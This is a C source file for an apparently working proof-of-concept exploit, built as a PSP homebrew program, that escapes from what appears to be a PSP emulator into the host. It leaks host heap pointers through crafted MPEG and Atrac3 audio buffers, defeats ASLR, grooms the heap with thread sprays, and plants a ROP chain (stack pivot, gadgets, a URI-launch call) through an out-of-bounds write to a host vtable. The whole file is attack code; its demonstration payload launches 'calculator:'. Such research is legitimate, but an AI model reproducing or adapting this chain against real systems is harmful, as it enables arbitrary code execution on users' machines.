#include <pspkernel.h>
#include <pspsdk.h>
#include <psptypes.h>
#include <pspatrac3.h>
#include <pspmpeg.h>
#include <psputility.h>
#include <pspiofilemgr.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include "visual.h"
#include "exploit.h"

PSP_MODULE_INFO("poc", 0, 1, 0);
PSP_MAIN_THREAD_ATTR(THREAD_ATTR_USER);

extern const unsigned char craft_pmf[];

static void w32(u8*p,unsigned v){memcpy(p,&v,4);}
static void w16(u8*p,unsigned short v){memcpy(p,&v,2);}
static void wtag(u8*p,const char*t){memcpy(p,t,4);}

static void build_riff(u8*buf,unsigned fileSize,unsigned D){
	unsigned doff=D%BPF; while(doff<0x100)doff+=BPF;
	unsigned F=(D-doff)/BPF-1u; unsigned startS=2u*SPF+F*SPF;
	memset(buf,0,BUF_SIZE);
	wtag(buf+0x00,"RIFF"); w32(buf+0x04,fileSize-8); wtag(buf+0x08,"WAVE");
	wtag(buf+0x0C,"fmt "); w32(buf+0x10,52); w16(buf+0x14,0xFFFE); w16(buf+0x16,2);
	w32(buf+0x18,44100); w32(buf+0x1C,0x2000); w16(buf+0x20,BPF); w16(buf+0x22,16);
	w32(buf+0x24,0x00000016);
	unsigned S=0x48+16;
	wtag(buf+0x48,"fact"); w32(buf+0x48+4,8); w32(buf+0x48+8,FACT_END); w32(buf+0x48+12,0);
	wtag(buf+S,"smpl"); w32(buf+S+4,36+24); w32(buf+S+8+28,1);
	unsigned o=S+8+36;
	w32(buf+o+0,0); w32(buf+o+4,0); w32(buf+o+8,startS); w32(buf+o+12,startS+1);
	w32(buf+o+16,0); w32(buf+o+20,0);
	unsigned junk=S+8+36+24; if(junk&1)junk++;
	if(doff>junk+8){wtag(buf+junk,"junk"); w32(buf+junk+4,doff-junk-0x10);}
	wtag(buf+doff-8,"data"); w32(buf+doff-4,fileSize-doff);
	memset(buf+doff,0x41,fileSize-doff);
}

static int thread_stub(SceSize a,void*p){(void)a;(void)p;return 0;}
extern int sceKernelCreateTlspl(const char*,int,unsigned,unsigned,unsigned,unsigned);
extern int sceKernelDeleteTlspl(int);

static SceMpegRingbuffer g_ring;
static SceMpeg g_mpeg;
static SceInt32 g_off=0;

static int g_file=-1;
static SceInt32 ring_cb(ScePVoid d,SceInt32 n,ScePVoid p){
	(void)p; int r=sceIoRead(g_file,d,n*2048); if(r<0)return -1; return r/2048;
}
static SceMpegStream*st; static SceMpegAu au; static void*es;

static int do_decode(int fw){
	sceIoLseek(g_file,g_off,SEEK_SET);
	int fp=sceMpegRingbufferAvailableSize(&g_ring); sceMpegRingbufferPut(&g_ring,fp,fp);
	SceInt32 unk=0; int gr=sceMpegGetAvcAu(&g_mpeg,st,&au,&unk); if(gr<0)return 0;
	volatile unsigned int vb=0x04200000u; SceInt32 init=1;
	int dr=sceMpegAvcDecode(&g_mpeg,&au,fw,(void*)&vb,&init);
	return dr==0;
}

static void unswizzle(u8*out,int fw){
	int bxc=fw*4/16, pitch=fw*4;
	for(int bx=0;bx<bxc;bx++) for(int n=0;n<8;n++){
		int d=(bx*8+n)*16, s=bx*16+n*pitch;
		for(int i=0;i<16;i++) out[s+i]=*(volatile u8*)(0x04200000u+d+i);
	}
}
static u64 rq(const u8*p){u64 v;memcpy(&v,p,8);return v;}

static void make_surgical(u8*buf,u64 db,u64 sbase){
	u64 *vv=(u64*)(buf+S_OFF);
	u64 urip=db+S_OFF+0x200;
	memset(buf+S_OFF,0,0x400);
	vv[0]=sbase+RVA_PIVOT;
	vv[2]=sbase+RVA_G2;
	vv[3]=sbase+RVA_G3;
	vv[4]=sbase+RVA_G4;
	vv[5]=sbase+RVA_G5;
	vv[6]=sbase+RVA_G6;
	vv[8]=sbase+RVA_POPRDX;
	vv[9]=urip;
	vv[10]=sbase+RVA_LAUNCH_URI;
	vv[11]=sbase+RVA_SPIN;
	static const char URI[]="calculator:";
	memcpy(buf+S_OFF+0x200,URI,sizeof(URI));
}

static u8 h48[8*FWLEAK48*4];
static int find_atrac_id(u8*h,u64*out_vt,u64*out_db,int*out_id,int want_id){
	for(int o=0;o+0x98<=8*FWLEAK48*4;o+=8){
		u64 v=rq(h+o);
		if((v&0xffff)==0xd708u){
			u64 db=rq(h+o+0x90);
			if(db){ int id=(int)(rq(h+o+0xb8)&0xffffffff); if(want_id>=0 && id!=want_id) continue;
				*out_vt=v; *out_db=db; *out_id=id; return o; }
		}
	}
	return -1;
}
static u8 h284[8*FWLEAK*4];

static int scan284(u64*cand,int*offs,int maxc,u64*vt){
	int nc=0; *vt=0;
	for(int o=0;o+0x98<=8*FWLEAK*4;o+=8){
		u64 v=rq(h284+o);
		if((v&0xffff)==0xc0c0u){
			u64 b=v-RVA_PSPTHREAD_VT;
			if((b&0xffff)==0){
				u64 sp=rq(h284+o+0x90); u32 stt; memcpy(&stt,h284+o+0x38,4);
				if(sp>0x100000000ULL && (sp&0xf)==4 && (stt&0x10) && !(stt&0x20)){
					if(!*vt) *vt=v;
					if(nc<maxc){ offs[nc]=o; cand[nc++]=sp-0xa4; }
				}
			}
		}
	}
	return nc;
}

int main(int argc,char**argv){
	(void)argc;(void)argv;
	visual_intro();
	visual_stage("PRIMING MEDIA ENGINE", "MPEG AVC LEAK CHANNEL", 10);
	sceUtilityLoadModule(PSP_MODULE_AV_AVCODEC); sceUtilityLoadModule(PSP_MODULE_AV_MPEGBASE); sceMpegInit();
	int rbPackets=0x3C0; int rbSize=sceMpegRingbufferQueryMemSize(rbPackets); void*rbData=malloc(rbSize);
	int mpegSize=sceMpegQueryMemSize(0); void*mpegData=malloc(mpegSize);
	sceMpegRingbufferConstruct(&g_ring,rbPackets,rbData,rbSize,ring_cb,NULL);
	sceMpegCreate(&g_mpeg,mpegData,mpegSize,&g_ring,48,0,0);
	g_file=sceIoOpen("disc0:/PSP_GAME/craft.pmf",PSP_O_RDONLY,0777);
	if(g_file<0){ visual_failure(); sceKernelExitGame(); return 1; }
	SceMpegAvcMode mode; mode.iUnk0=-1; mode.iPixelFormat=3; sceMpegAvcDecodeMode(&g_mpeg,&mode);
	unsigned char*hdr=malloc(2048); memcpy(hdr,craft_pmf,2048);
	SceInt32 off=0,ss=0; sceMpegQueryStreamOffset(&g_mpeg,hdr,&off); sceMpegQueryStreamSize(hdr,&ss); free(hdr);
	g_off=off;
	st=sceMpegRegistStream(&g_mpeg,0,0); es=sceMpegMallocAvcEsBuf(&g_mpeg);
	sceMpegInitAu(&g_mpeg,es,&au);

	for(int n=0;n<PREDEC;n++) do_decode(FWLEAK48);
	{ int bb=sceKernelCreateTlspl("BB",2,0,4,BIGC,0); if(bb>=0) sceKernelDeleteTlspl(bb); }
	visual_stage("HEAP ORACLE ONLINE", "SEARCHING HOST OBJECTS", 20);

	static u8 a[BUF_SIZE];
	static u8 vbytes[VICTIM_BYTES];
	static int tids[NTH];
	static int Lids[4];

	u64 databuf=0, base=0;
	int idB=-1; int nt=0; int nL=0;
	u64 victim=0; int ov=-1; u32 vtid=0;
	u64 db=0, delta=0; int conv=0;
	int outer_ok=0;

	for(int outer=0; outer<MAXOUTER && !outer_ok; outer++){
		if(outer==0) visual_stage("LEAKING HOST POINTERS", "VTABLE AND DATABUF", 28);
		else visual_stage("RETRYING HEAP LAYOUT", "FRESH HOST OBJECT GRAPH", 24);
		if(outer>0){
			for(int i=0;i<nL;i++){ if(Lids[i]>=0) sceAtracReleaseAtracID(Lids[i]); }
			if(idB>=0) sceAtracReleaseAtracID(idB);
			nL=0; idB=-1;
			for(int i=0;i<nt;i++){ if(tids[i]>=0){ sceKernelDeleteThread(tids[i]); tids[i]=-1; } }
			nt=0;
			for(int n=0;n<REFRESH;n++) do_decode(FWLEAK48);
		}

		databuf=0; int att=0, found=-1;
		for(att=0; att<MAXATT; att++){
			build_riff(a,FILE_SIZE,0xcc00);
			int idA=sceAtracSetHalfwayBufferAndGetID(a,FILE_SIZE-1,FILE_SIZE-1);
			int tB =sceAtracSetHalfwayBufferAndGetID(a,FILE_SIZE-1,FILE_SIZE-1);
			if(idA<0||tB<0){ break; }
			sceAtracReleaseAtracID(idA);
			if(!do_decode(FWLEAK48)){ sceAtracReleaseAtracID(tB); continue; }
			unswizzle(h48,FWLEAK48);
			u64 v,dd; int id;
			if(find_atrac_id(h48,&v,&dd,&id,-1)>=0){
				databuf=dd; idB=tB; found=att;
				break;
			}
			sceAtracReleaseAtracID(tB);
		}
		if(found<0){ continue; }
		visual_stage("HOST BUFFER LEAKED", "HOST HEAP ADDRESS ONLINE", 40);

		nL=0;
		for(int i=0;i<NSAC;i++){ int L=sceAtracSetHalfwayBufferAndGetID(a,FILE_SIZE-1,FILE_SIZE-1); if(L>=0)Lids[nL++]=L; else break; }
		int nt0=nt;
		for(int i=0;i<NTHREAD && nt<NTH;i++){int t=sceKernelCreateThread("ft",(SceKernelThreadEntry)thread_stub,0x20,0x1000,0,0); if(t>=0)tids[nt++]=t;}
		if(nt0>0){ sceKernelDeleteThread(tids[nt0-1]); tids[nt0-1]=-1; }

		u64 cand[MAXCAND]; int offs[MAXCAND];
		int fx=nt/2+2; victim=0; ov=-1; vtid=0; u64 nvt=0;
		for(int i=0;i<PREWARM;i++){ int idx=nt/2+2+i*PSTRIDE; if(idx<nt-DELCAP && tids[idx]>=0){ sceKernelDeleteThread(tids[idx]); tids[idx]=-1; } }
		for(int g=0; g<=NOVRETRY && !victim; g++){
			if(g>0){
				for(int i=0;i<NOVSPRAY && nt<NTH;i++){ int t=sceKernelCreateThread("nv",(SceKernelThreadEntry)thread_stub,0x20,0x1000,0,0); if(t>=0)tids[nt++]=t; else break; }
				fx=nt/2+2;
			}
			for(int a284=0; a284<MAXA284 && !victim; a284++){
				if(fx<nt-DELCAP && tids[fx]>=0){ sceKernelDeleteThread(tids[fx]); tids[fx]=-1; fx++; }
				if(!do_decode(FWLEAK)) continue;
				unswizzle(h284,FWLEAK);
				int nc=scan284(cand,offs,MAXCAND,&nvt);
				if(!nvt) continue;
				u64 best=0; int bo=-1;
				for(int i=0;i<nc;i++){
					if(cand[i]<=databuf) continue;
					if(cand[i]>best){ best=cand[i]; bo=offs[i]; }
				}
				if(best){ victim=best; ov=bo; break; }
			}
		}
		if(!victim){ continue; }
		base=nvt-RVA_PSPTHREAD_VT;
		visual_stage("ASLR BASE RECOVERED", "REBASED FROM PSPTHREAD", 58);
		visual_stage("PSPTHREAD VICTIM LOCKED", "HOST OBJECT UNDER CONTROL", 68);
		memcpy(&vtid,h284+ov+0x08,4);
		{ int vbc=VICTIM_BYTES; if(ov+vbc>8*FWLEAK*4) vbc=8*FWLEAK*4-ov; memcpy(vbytes,h284+ov,vbc); }
		visual_stage("POSITIONING HOST BUFFER", "HEAP DELTA CONVERGENCE", 76);

		db=databuf; conv=0;
		for(int it=0; it<24; it++){
			if(db>=victim) break;
			u64 want=db; delta=victim-want;
			build_riff(a,FILE_SIZE,(unsigned)delta);
			make_surgical(a,want,base);
			sceAtracSetHalfwayBuffer(idB,a,FILE_SIZE-1,FILE_SIZE-1);
			u64 nd=0;
			for(int rep=0; rep<CREPS; rep++){
				if((rep&7)==7){ int dA=sceAtracSetHalfwayBufferAndGetID(a,FILE_SIZE-1,FILE_SIZE-1); if(dA>=0) sceAtracReleaseAtracID(dA); }
				if(do_decode(FWLEAK48)){ unswizzle(h48,FWLEAK48);
					u64 v,dd; int id;
					if(find_atrac_id(h48,&v,&dd,&id,idB)>=0){ nd=dd; break; }
				}
			}
			if(nd!=0 && nd==want && nd<victim){ conv=1; break; }
			if(nd) db=nd;
		}
		if(!(conv && db<victim)) continue;
		if(delta>>32) continue;
		int vok=0;
		for(int k=0;k<ORACLE_REPS && !vok;k++){
			if(do_decode(FWLEAK)){ unswizzle(h284,FWLEAK);
				u64 oc[MAXCAND]; int oo[MAXCAND]; u64 ovt=0;
				int onc=scan284(oc,oo,MAXCAND,&ovt);
				for(int i=0;i<onc;i++){ if(oc[i]==victim){ vok=1; break; } }
			}
		}
		if(!vok) continue;
		sceAtracAddStreamData(idB,1);
		u8 *wp=NULL; u32 av=0, ro=0;
		sceAtracGetStreamDataInfo(idB,&wp,&av,&ro);
		unsigned srcOff=(unsigned)((uintptr_t)wp-(uintptr_t)a);
		if(srcOff+8>BUF_SIZE) continue;
		u64 V=db+S_OFF;
		memcpy(a+srcOff,&V,8);
		visual_stage("TRIGGERING OOB WRITE", "8 BYTES TO HOST VTABLE", 90);
		int ar=sceAtracAddStreamData(idB,8); (void)ar;
		outer_ok=1;
	}
	if(!outer_ok){ visual_failure(); sceKernelExitGame(); return 1; }
	visual_climax();

	if(vtid){ sceKernelDeleteThread(vtid); }
	for(int i=nt-1;i>=0;i--){ if(tids[i]>=0) sceKernelDeleteThread(tids[i]); }
	sceKernelDelayThread(2*1000*1000);
	sceKernelExitGame();
	return 0;
}
